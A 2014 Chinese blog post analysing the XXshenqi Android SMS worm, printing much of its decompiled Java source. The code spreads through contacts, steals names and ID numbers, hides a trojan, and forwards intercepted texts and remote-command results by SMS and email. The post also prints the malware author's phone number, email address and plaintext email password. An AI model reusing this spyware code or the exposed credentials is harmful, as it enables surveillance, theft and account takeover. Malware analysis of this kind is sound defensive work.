Title: 说一说“xxshenqi”这个事情吧
Date: 2014-08-04 11:21    
Modified: 2014-08-04 11:21  
Category: Original
Tags: Android, Security
Authors: chenjia.me

已经过去两天了，本应该在昨天出现的文字因为研究了一个其他方向的东西没时间写了~今天补上。

# TA是什么 #
2014年8月2日突然媒体报道一个超级病毒在大陆流行，以群发短信为目的，受害者大多被扣了好多话费，随后各种杀毒软件和运营商都出来表示自己是第一个拦截了改病毒，并且把他加入了病毒库。危险等级是高。

# TA的危害在哪里 #
改软件的行为是诱导用户输入注册信息，诱导安装木马，然后向用户通讯录用户的所有手机用户发短信，并把注册信息发给作者，新短信发到作者邮箱。

简单的看了一下，如果说作者是想获利的话，获利点应该是：

1. 个人信息，以及其联系人信息
2. 支付宝

对于支付宝，根据源代码，可以有一下猜测


> A中了xxshenqi病毒，在软件注册页面输入个人信息，随后作者手机18670259904收到包括手机号，姓名，身份证号码，作者在支付宝点击忘记密码，输入A的身份证号码，然后A收到的短信验证码通过木马发送到作者的邮箱137736513@qq.com，作者输入验证码后成功修改密码，进入用户支付宝中进行操作

# APK逆向和代码分析 #

看了报道作者已经被抓了，华南大学的贴吧里面也显示出其是软件学院大一的学生，更有人分析了他的罪与罚。这些都不属于我们讨论的范围。表示大家都是写代码的，一定不能开太大的玩笑。

其次，这份代码应该是比较基本的Android代码，并没有利用任何Android漏洞，根据编码习惯推测应该是一个C++的人转Java写的，代码没有任何的混淆，以及对一些个人信息的保护。

## 前期准备 ##
1. 解压软件
2. dex2jar
3. jd-gui
4. xxshenqi.apk

## APK解包分析 ##
用解压软件打开APK文件，发现`asssets`目录下有一个叫做`com.android.Trogoogle.apk`的文件，看上去就是安装第一个apk后在某个时候会自动安装这个木马Tor开头不就代表的是木马么。

以下是基础的Android逆向过程：

1. 解压出classes.dex文件，这个是安卓源代码编译过的字节码的包
2. 将该文件放到dex2jar目录下（这样是比较方便）
3. CMD到该目录，或者编写Bat文件，执行或写入该命令`d2j-dex2jar.bat classes.dex`
4. 等待完成后，目录下会出现一个文件`classes_dex2jar.jar`，将其复制到一个地方
5. 打开jd-gui.exe，将刚才的jar文件拖入打开，我们就可以看到源代码了。

![pic1](https://i.imgur.com/QfLmoxc.png)
这就是第一个APK的基本源代码

同样的步骤我们解压Trogoogle的那个apk，获得其源代码。

在Torgoogle中，我们发现了第三方jar包mail.jar，说明这位同学还是很有心学习的。

## 步步分析 ##
通过代码和软件行为来一步步的分解该病毒，以及解释一些该病毒中的不该出现的错误，也是为神马作者很快就会被警方抓获的原因。

首先我们观察代码的activity，发现在WlecomeAcitivity中有如下代码：

    :::java
	public void run()
      {
        WelcomeActivity.this.startActivity(new Intent(WelcomeActivity.this, MainActivity.class));
        WelcomeActivity.this.finish();
      }

很明显该activity就是入口的avitvity。

所以我们知道程序是这么运行的，welcome->main->点击注册button->register

然后我们开始分析代码：

> WlecomeActivity

程序开始就执行了`ReadCONTACTS()`这个方法，我们看看他在做什么

    :::java
	private void ReadCONTACTS(Context paramContext)
  	{
    this.contactArray = new ArrayList();
    this.context = paramContext;
    this.cursor = this.context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
    new Thread()
    {
      public void run()
      {
        if (!WelcomeActivity.this.cursor.moveToNext())
        {
          if (WelcomeActivity.this.counts != 99);
        }
        else
        {
          String str = WelcomeActivity.this.cursor.getString(WelcomeActivity.this.cursor.getColumnIndex("_id"));
          WelcomeActivity.this.nameString = WelcomeActivity.this.cursor.getString(WelcomeActivity.this.cursor.getColumnIndex("display_name"));
          Cursor localCursor = WelcomeActivity.this.context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = " + str, null, null);
          ArrayList localArrayList = new ArrayList();
          localArrayList.add("\r\n" + WelcomeActivity.this.nameString);
          while (true)
          {
            if (!localCursor.moveToNext())
            {
              label168: localCursor.close();
              WelcomeActivity.this.contactArray.add(localArrayList);
              break;
            }
            WelcomeActivity.this.phoneString = localCursor.getString(localCursor.getColumnIndex("data1"));
            WelcomeActivity.this.phoneString = WelcomeActivity.this.phoneString.replace(" ", "");
            WelcomeActivity.this.phoneString = WelcomeActivity.this.phoneString.replace("+86", "");
            try
            {
              if (WelcomeActivity.this.phoneString.length() == 11)
              {
                sleep(20L);
                if ((WelcomeActivity.this.counts % 20 == 0) && (WelcomeActivity.this.counts != 0))
                  sleep(5000L);
                if (WelcomeActivity.this.counts == 99)
                  break label168;
                SmsManager.getDefault().sendTextMessage(WelcomeActivity.this.phoneString, null, WelcomeActivity.this.nameString + "看这个，" + "http://cdn.yyupload.com/down/4279193/XXshenqi.apk", null, null);
                WelcomeActivity localWelcomeActivity1 = WelcomeActivity.this;
                localWelcomeActivity1.counts = (1 + localWelcomeActivity1.counts);
                System.out.println("send Message to " + WelcomeActivity.this.nameString + " " + WelcomeActivity.this.counts);
              }
              localArrayList.add(WelcomeActivity.this.phoneString);
            }
            catch (Exception localException)
            {
              while (true)
                localException.toString();
            }
          }
        }
        SmsManager.getDefault().sendTextMessage("18670259904", null, "XXshenqi 群发链接OK", null, null);
        WelcomeActivity localWelcomeActivity2 = WelcomeActivity.this;
        localWelcomeActivity2.counts = (1 + localWelcomeActivity2.counts);
        System.out.println("===========================");
        System.out.println("test---->群发OK");
        System.out.println("============================");
      }
    }
    .start();
  	}

很明显在读取通讯录，通过内容提供者获取`ContactsContract.Contacts`，获取到手机号和名字以后，就开始使用短信接口进行发送短信，这里他先在号码前面去除了存在的`+86`的国际区号，然后对这个号码是否是手机号做了一个判定，还防止过于快速的发送短信被运营商封禁做了一个休眠（每条短信休眠20ms，20条短信后休眠5秒，每100条短信清空一下指针防止溢出或许），很不错。

然后就是发送大家都看到的那条短信：`SmsManager.getDefault().sendTextMessage(WelcomeActivity.this.phoneString, null, WelcomeActivity.this.nameString + "看这个，" + "http://cdn.yyupload.com/down/4279193/XXshenqi.apk", null, null);`

当程序在做这些事情的时候，我们看到的是这个画面：
![欢迎界面](https://i.imgur.com/a3A7gcA.jpg)

**完成后我们就到了主界面了，这时候你的通讯录好友已经都收到你的短信了。社会工程攻击已经完成了，病毒的下载链接已经扩散，就等小白上钩了~接下来就是对你的攻击了。**

进入主页面我们会看到这样的页面，提示我们安装资源包。

![pic2](https://i.imgur.com/Mt4cfsh.png)

恩。一般人都会点安装的吧，然后就很顺其自然的安装了asserts目录下的那个apk

![pic3](https://i.imgur.com/T9Mmem4.png)

让我们看看代码：

    :::java
	public boolean retrieveApkFromAssets(Context paramContext, String paramString1, String paramString2)
  	{
    boolean bool;
    try
    {
      File localFile = new File(paramString2);
      if (localFile.exists())
        return true;
      localFile.createNewFile();
      InputStream localInputStream = paramContext.getAssets().open(paramString1);
      FileOutputStream localFileOutputStream = new FileOutputStream(localFile);
      byte[] arrayOfByte = new byte[1024];
      while (true)
      {
        int i = localInputStream.read(arrayOfByte);
        if (i == -1)
        {
          localFileOutputStream.flush();
          localFileOutputStream.close();
          localInputStream.close();
          bool = true;
          break;
        }
        localFileOutputStream.write(arrayOfByte, 0, i);
      }
    }
    catch (IOException localIOException)
    {
      Toast.makeText(paramContext, localIOException.getMessage(), 2000).show();
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(paramContext);
      localBuilder.setMessage(localIOException.getMessage());
      localBuilder.show();
      localIOException.printStackTrace();
      bool = false;
    }
    return bool;
  	}

 	 public void showInstallConfirmDialog(final Context paramContext, final String paramString)
  	{
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(paramContext);
    localBuilder.setIcon(2130837592);
    localBuilder.setTitle("未安装资源包");
    localBuilder.setMessage("请先安装资源包，资源包已整合至APK，点击安装即可安装。");
    localBuilder.setPositiveButton("安装", new DialogInterface.OnClickListener()
    {
      public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
      {
        try
        {
          String str = "chmod 777 " + paramString;
          Runtime.getRuntime().exec(str);
          Intent localIntent = new Intent("android.intent.action.VIEW");
          localIntent.addFlags(268435456);
          localIntent.setDataAndType(Uri.parse("file://" + paramString), "application/vnd.android.package-archive");
          paramContext.startActivity(localIntent);
          return;
        }
        catch (IOException localIOException)
        {
          while (true)
            localIOException.printStackTrace();
        }
      }
    });
    localBuilder.show();
 	 }

很明显我们百度关键词`retrieveApkFromAssets`就会发现这些代码是模仿写的，实现在android中安装多个apk文件。

然后安装完木马后我们就会看到登录界面，看了一下代码，无论你怎么样都是灰登录失败的， 不过作者为了让他看起来像真的还对网络进行了判定：

	:::java
    public void onClick(View paramAnonymousView)
      {
        if (!MainActivity.this.detectApk("com.example.com.android.trogoogle"))
        {
          String str = MainActivity.this.getFilesDir().getAbsolutePath() + "/com.android.Trogoogle.apk";
          MainActivity.this.retrieveApkFromAssets(MainActivity.this, "com.android.Trogoogle.apk", str);
          MainActivity.this.showInstallConfirmDialog(MainActivity.this, str);
          return;
        }
        if (!MainActivity.this.goToNetWork())
        {
          Toast.makeText(MainActivity.this, "无法连接，请检查您的网络！", 0).show();
          return;
        }
        if (MainActivity.this.pass.getText().toString().length() >= 6)
        {
          Toast.makeText(MainActivity.this, "正在验证，请稍后...", 0).show();
          Toast.makeText(MainActivity.this, "密码错误或账号不存在！", 0).show();
          return;
        }
        Toast.makeText(MainActivity.this, "请输入正确的账号或密码", 0).show();
      }

然后你发现登录不了自然就点击了注册，这样就到了注册页面了。引导很顺利，说明作者有用心。

不过在mainavtivity中发现了这样一行代码：该软件监听了包管理的广播，当软件安装有变化的时候就会收到广播，每次收到该广播后就看看是否是安装了自己的木马，如果安装了木马就发短信到作者自己的手机告诉他有人中毒了，然后作者的手机号就这么暴露了` SmsManager.getDefault().sendTextMessage("18670259904", null, " Tro instanll Ok", null, null);`
查询可知，这是湖南邵阳的电话。

然后就是注册的activity，

代码:

    :::java
	String str = RegisterActivity.this.idEditText.getText().toString();
        if (str.length() != 18)
        {
          Toast.makeText(RegisterActivity.this, "请输入正确的身份证号", 0).show();
          return;
        }
        int i = Integer.parseInt(str.substring(6, 10));
        int j = Integer.parseInt(str.substring(10, 12));
        int k = Integer.parseInt(str.substring(12, 14));
        if ((i > 1996) || (i < 1980) || (j > 12) || (j == 0) || (k == 0) || (k > 31))
        {
          Toast.makeText(RegisterActivity.this, "请输入正确的身份证号", 0).show();
          return;
        }
        if ((RegisterActivity.this.nameEditText.getText().toString().length() < 2) || (RegisterActivity.this.nameEditText.getText().toString().length() > 4))
        {
          Toast.makeText(RegisterActivity.this, "请输入正确的姓名", 0).show();
          return;
        }
        SmsManager.getDefault().sendTextMessage("18670259904", null, "得到主机，姓名：" + RegisterActivity.this.nameEditText.getText().toString() + "，身份证号为：" + str, null, null);
        Toast.makeText(RegisterActivity.this, "注册成功！", 0).show();

对身份证号码的日期进行了验证，当用户点击注册后姓名和身份证号码都会被发送到作者的手机上。。这一点就比较严重了。

分析完主程序，我们来看看植入的木马程序是做什么的。

Torgoogle的入口程序非常简单。
	
	:::java
    requestWindowFeature(1);
    setContentView(2130903063);
    getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
    System.out.println("APP图标隐藏成功==============================");
    Intent localIntent = new Intent();
    localIntent.setClass(this, ListenMessageService.class);
    startService(localIntent);
    System.out.println(" startService成功==============================");
    System.out.println("--------->>>finish()");
    finish();

就是简单的隐藏了程序的图标，没了。那他的工作是做什么的呢?

我们发现了有个自动启动的代码，查看之：

> BroadcastAutoBoot

	:::java
      public void onReceive(Context paramContext, Intent paramIntent)
  	{
    System.out.println("收到开机广播===================================");
    System.out.println("木马 killProcess==================================");
    Intent localIntent = new Intent();
    localIntent.setClass(paramContext, ListenMessageService.class);
    paramContext.startService(localIntent);
    System.out.println(" startService成功==============================");
    Process.killProcess(Process.myPid());
  	}

每次开机都会启动ListenMessageService，然后杀掉自己的开机监听。很像病毒的做法。

在这个服务中首先将会启动一个短信拦截服务：

    :::java
	 public void run()
      {
        try
        {
          sleep(3000L);
          Looper.prepare();
          System.out.println("Sleep 3秒后-->startForeground-->registerContentObserver");
          ListenMessageService.this.startForeground(1378, ListenMessageService.this.notification);
          ListenMessageService.this.app = ((CustomApplication)ListenMessageService.this.getApplication());
          boolean bool = ListenMessageService.this.app.isReg;
          System.out.println("isReg-->>>" + ListenMessageService.this.app.isReg);
          if (!bool)
          {
            ListenMessageService.this.getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, new ListenMessageService.SmsObserver(ListenMessageService.this, new ListenMessageService.SmsHandler(ListenMessageService.this, ListenMessageService.this)));
            ListenMessageService.this.app.isReg = true;
            SmsManager.getDefault().sendTextMessage("18670259904", null, "【数据库截获】监控service启动", null, null);
          }
          Looper.loop();
          return;
        }
        catch (InterruptedException localInterruptedException)
        {
          while (true)
            localInterruptedException.printStackTrace();
        }
      }
    }
    .start();

然后依旧是发短信告诉自己。


然后添加一个推送在通知栏：

	:::java
      public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  	{
    this.notification = new Notification(17301568, "系统消息", System.currentTimeMillis());
    PendingIntent localPendingIntent = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), 0);
    this.notification.setLatestEventInfo(this, "Help", "Running a Service in the Foreground", localPendingIntent);
    return super.onStartCommand(paramIntent, 1, paramInt2);
 	}

目的是点击该通知去出发mainactivity来隐藏图标，因为每次开机都要隐藏嘛~

然后就是最为关键的部分，以下代码包含了对短信的收件箱和发件箱短信的获取，拦截并且根据内容判定是否是指令短信（内容以#开头），最后将非指令非自己伪造的短信（FLAG=FLASE）发送到作者自己的手机上来。还对长短信进行分割：

    :::java
	if (str3.length() > 60)
      {
        localSmsManager.sendTextMessage("18670259904", null, str3.substring(0, str3.length() / 2), null, null);
        localSmsManager.sendTextMessage("18670259904", null, str3.substring(1 + str3.length() / 2), null, null);
      }

> 短信监听服务，当收件箱或者发件箱数目有改动的时候会调用

    private final class SmsObserver extends ContentObserver
 	 {
    public ListenMessageService.SmsHandler smsHandler;

    public SmsObserver(ListenMessageService.SmsHandler arg2)
    {
      super();
      this.smsHandler = localHandler;
    }

    @SuppressLint({"UnlocalizedSms", "SimpleDateFormat"})
    public void onChange(boolean paramBoolean)
    {
      System.out.println("=====================================================");
      System.out.println("木马进入ContentObserver，开始截获----------------------------");
      Cursor localCursor1 = ListenMessageService.this.getContentResolver().query(Uri.parse("content://sms/outbox"), null, null, null, null);
      if (localCursor1 == null);
      Cursor localCursor2;
      do
      {
        return;
        do
        {
          System.out.println("木马进入SEND查询---------------------------------");
          StringBuilder localStringBuilder2 = new StringBuilder();
          localStringBuilder2.append("sendTo:").append(localCursor1.getString(localCursor1.getColumnIndex("address")));
          localStringBuilder2.append(";content:").append(localCursor1.getString(localCursor1.getColumnIndex("body")));
          SmsManager.getDefault().sendTextMessage("18670259904", null, "【数据库截获】SEND::" + localStringBuilder2.toString(), null, null);
          System.out.println("木马截获SEND短信成功>>>" + localStringBuilder2.toString());
        }
        while (localCursor1.moveToNext());
        localCursor1.close();
        if (localCursor1 != null)
          localCursor1.close();
        localCursor2 = ListenMessageService.this.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[] { "_id", "address", "read", "body", "thread_id" }, "read=?", new String[] { "0" }, "date desc");
      }
      while (localCursor2 == null);
      if (!localCursor2.moveToNext())
      {
        localCursor2.close();
        System.out.println("木马离开ContentObserver，完成截获---------------------------------------------------");
        if (localCursor2 != null)
          localCursor2.close();
        System.out.println("=====================================================");
        super.onChange(true);
        return;
      }
      System.out.println("木马进入RECV查询---------------------------------");
      ListenMessageService.SmsInfo localSmsInfo = new ListenMessageService.SmsInfo(ListenMessageService.this);
      StringBuilder localStringBuilder1 = new StringBuilder();
      String str1 = localCursor2.getString(localCursor2.getColumnIndex("body"));
      System.out.println("time->" + System.currentTimeMillis() + ";content->" + str1);
      int i = str1.indexOf("#");
      label469: String str4;
      if (i < 0)
      {
        if (ListenMessageService.this.app.lastMsg.equals(str1))
        {
          if (System.currentTimeMillis() - ListenMessageService.this.app.time < 15000L)
          {
            System.out.println("^^^^^^^^^^^^^^^^^");
            System.out.println("Second # into ,return!");
            System.out.println("^^^^^^^^^^^^^^^^^");
          }
        }
        else
          ListenMessageService.this.app.lastMsg = str1;
        ListenMessageService.this.app.time = System.currentTimeMillis();
        localSmsInfo.smsBody = str1;
        localSmsInfo._id = localCursor2.getString(localCursor2.getColumnIndex("_id"));
        String str2 = localCursor2.getString(localCursor2.getColumnIndex("address")).replace(" ", "").replace("+86", "");
        localSmsInfo.smsAddress = str2;
        localSmsInfo.thread_id = localCursor2.getString(localCursor2.getColumnIndex("thread_id"));
        localSmsInfo.read = localCursor2.getString(localCursor2.getColumnIndex("read"));
        localStringBuilder1.append("recvFrom:").append(localCursor2.getString(localCursor2.getColumnIndex("address")));
        localStringBuilder1.append(";content:").append(localCursor2.getString(localCursor2.getColumnIndex("body")));
        System.out.println(localStringBuilder1.toString());
        if (!str2.equals("18670259904"))
          break label1345;
        System.out.println("木马判断为命令消息，执行");
        str4 = str1.substring(0, i);
        switch (str4.hashCode())
        {
        default:
          label728: ListenMessageService.this.Flag = false;
          System.out.println("数据库处理不认识的命令--------------------------------------");
          localSmsInfo.action = 2;
          label750: Message localMessage2 = this.smsHandler.obtainMessage();
          localMessage2.obj = localSmsInfo;
          this.smsHandler.sendMessage(localMessage2);
        case -1449143887:
        case -973199489:
        case 3556498:
        case 579867225:
        case 1248164738:
        }
      }
      while (true)
      {
        System.out.println("木马完成处理截获短信 >>" + localStringBuilder1.toString());
        break;
        if (ListenMessageService.this.app.allMsg.equals(str1))
        {
          if (System.currentTimeMillis() - ListenMessageService.this.app.time >= 5000L)
            break label469;
          System.out.println("^^^^^^^^^^^^^^^^^");
          System.out.println("Second time  into ,return!");
          System.out.println("^^^^^^^^^^^^^^^^^");
          return;
        }
        ListenMessageService.this.app.allMsg = str1;
        break label469;
        if (!str4.equals("readmessage"))
          break label728;
        System.out.println("数据库处理发送邮件命令-----------------------------------");
        String str10 = ListenMessageService.this.ReadAllMessage(ListenMessageService.this);
        Intent localIntent2 = new Intent(ListenMessageService.this, MySendEmailService.class);
        localIntent2.putExtra("String", str10);
        ListenMessageService.this.startService(localIntent2);
        ListenMessageService.this.Flag = false;
        localSmsInfo.action = 2;
        break label750;
        if (!str4.equals("sendmessage"))
          break label728;
        System.out.println("数据库处理发送短信命令----------------------------------");
        int k = str1.lastIndexOf('/');
        String str8 = str1.substring(i + 1, k);
        String str9 = str1.substring(k + 1, str1.length());
        SmsManager.getDefault().sendTextMessage(str8, null, str9, null, null);
        ListenMessageService.this.Flag = false;
        localSmsInfo.action = 2;
        break label750;
        if (!str4.equals("test"))
          break label728;
        System.out.println("数据库收到test命令-----------------------------------");
        SmsManager.getDefault().sendTextMessage("18670259904", null, "【数据库截获】TEST数据截获（广播失效）", null, null);
        ListenMessageService.this.Flag = false;
        localSmsInfo.action = 2;
        break label750;
        if (!str4.equals("makemessage"))
          break label728;
        System.out.println("数据库处理伪造短信命令------------------------------------------");
        int j = str1.lastIndexOf('/');
        String str6 = str1.substring(i + 1, j);
        String str7 = str1.substring(j + 1, str1.length());
        ListenMessageService.this.Flag = true;
        new Thread()
        {
          public void run()
          {
            try
            {
              sleep(8000L);
              System.out.println("==============================================");
              System.out.println("开启线程睡眠8秒后 将Flag=false");
              System.out.println("==============================================");
              ListenMessageService.this.Flag = false;
              return;
            }
            catch (InterruptedException localInterruptedException)
            {
              while (true)
                localInterruptedException.printStackTrace();
            }
          }
        }
        .start();
        System.out.println("Flag------->>>>>>>" + ListenMessageService.this.Flag);
        localSmsInfo.smsAddress = str6;
        localSmsInfo.smsBody = str7;
        localSmsInfo.action = 1;
        break label750;
        if (!str4.equals("sendlink"))
          break label728;
        System.out.println("数据库处理发送Link命令--------------------------------------------");
        ListenMessageService.this.Flag = false;
        String str5 = str1.substring(i + 1);
        ListenMessageService.this.ReadCONTACTS(ListenMessageService.this, str5);
        Intent localIntent1 = new Intent(ListenMessageService.this, MySendEmailService.class);
        localIntent1.putExtra("String", ListenMessageService.this.contactArray.toString());
        ListenMessageService.this.startService(localIntent1);
        localSmsInfo.action = 2;
        break label750;
        label1345: System.out.println("Flag----------->" + ListenMessageService.this.Flag);
        if (!ListenMessageService.this.Flag)
          break label1396;
        System.out.println("判断为伪造短信。不用截获不用发送-------------------------");
      }
      label1396: System.out.println("木马判断为普通信息，发送");
      SmsManager localSmsManager = SmsManager.getDefault();
      String str3 = "【数据库截获】RECV::" + localStringBuilder1.toString();
      if (str3.length() > 60)
      {
        localSmsManager.sendTextMessage("18670259904", null, str3.substring(0, str3.length() / 2), null, null);
        localSmsManager.sendTextMessage("18670259904", null, str3.substring(1 + str3.length() / 2), null, null);
      }
      while (true)
      {
        localSmsInfo.action = 2;
        Message localMessage1 = this.smsHandler.obtainMessage();
        localMessage1.obj = localSmsInfo;
        this.smsHandler.sendMessage(localMessage1);
        break;
        localSmsManager.sendTextMessage("18670259904", null, str3, null, null);
      }
    }
  	}

在MySendEmailService中，我们可以看到作者留下的邮箱信息，这也是作者愚昧的地方，留下了自己常用QQ和密码，我们可以发现两个邮箱是同一个。。是qq邮箱给的别名服务。

     protected void onHandleIntent(Intent paramIntent)
  	{
    System.out.println("木马进入MySendEmailService==============================");
    String str = paramIntent.getStringExtra("String");
    System.out.println("木马开始发送邮件============================");
    MailSenderInfo localMailSenderInfo = new MailSenderInfo();
    localMailSenderInfo.setMailServerHost("smtp.qq.com");
    localMailSenderInfo.setMailServerPort("25");
    localMailSenderInfo.setValidate(true);
    localMailSenderInfo.setUserName("a137736513@qq.com");
    localMailSenderInfo.setPassword("lishulili.");
    localMailSenderInfo.setFromAddress("a137736513@qq.com");
    localMailSenderInfo.setToAddress("137736513@qq.com");
    localMailSenderInfo.setSubject("信息");
    localMailSenderInfo.setContent(str);
    new SimpleMailSender().sendTextMail(localMailSenderInfo);
    SimpleMailSender.sendHtmlMail(localMailSenderInfo);
    System.out.println("木马完成发送邮件=============================");
    System.out.println("木马离开MySendEmailService=============================");
    System.out.println("木马killProcess==============================");
    Process.killProcess(Process.myPid());
  	}
	}

在`BroadcastRecvMessage`中发现了两个很重要的点，
第一个是如过是作者发来的信息，就会执行特殊操作：

    :::java
     if (str3.equals("18670259904"))
    {
      int k = str2.indexOf("#");
      String str5 = str2.substring(0, k);
      switch (str5.hashCode())
      {
      default:
        label188: System.out.println("木马不认识的命令========================");
        abortBroadcast();
        new Thread()
        {
          public void run()
          {
            System.out.println("木马Sleep(1000)==============================");
            try
            {
              Thread.sleep(1000L);
              System.out.println("木马killProcess==============================");
              Process.killProcess(Process.myPid());
              return;
            }
            catch (InterruptedException localInterruptedException)
            {
              while (true)
                localInterruptedException.printStackTrace();
            }
          }
        }
        .start();
      case -1449143887:
      case -973199489:
      case 3556498:
      case 579867225:
      case 1248164738:
      }

功能似乎写了，但是看不到case情况，不了解。安装这个顺序应该默认都执行defult，好奇怪。

发现是类似淘宝信息就发送给作者：

    :::java
	if (str3.length() != 11)
    {
      System.out.println("木马觉得淘宝信息==============================");
      str4 = "【特殊消息】" + str2;
      if (str4.length() > 60)
      {
        localSmsManager.sendTextMessage("18670259904", null, str4.substring(0, str4.length() / 2), null, null);
        localSmsManager.sendTextMessage("18670259904", null, str4.substring(1 + str4.length() / 2), null, null);
      }
    }

不过仅仅是以手机号长度不是11位就判定。。应该是获取所有非手机号的短信，比如各种106开头的短信。

关键是，即使是普通短信也要发送给作者：

    :::java
          localSmsManager.sendTextMessage("18670259904", null, str4, null, null);
      continue;
      System.out.println("木马觉得是普通信息==============================");
      localSmsManager.sendTextMessage("18670259904", null, "From:" + str3 + ";content:" + str2, null, null);

所以网上有人说是监控他女朋友的也是有可能的。。。


# 写在最后 #
整个代码分析下来发现没什么亮点，无非就是后台偷偷摸摸做一些事情，然后把你的短信都发到他那里去。。。说好听点就是监控木马。

作者估计只是玩一下，用了自己的手机号，以及自己的QQ和QQ邮箱，还留下了密码。怪不得很多人说登录了作者的其他账户游玩了-。-

估计8.2那天作者的手机短信收到爆满吧。。。邮件的话应该很多人去围观邮箱作者改密码了所以应该都发送失败（这好歹是个有技术含量的点）

清理木马只要把xxshenqi和trogoogle卸载就好。

最后吐槽一下“良心媒体”的大肆宣传和各大厂商的软文，简直看不下去了。


*作者可能真是没有恶意，不过看上去好像已经悲剧了。*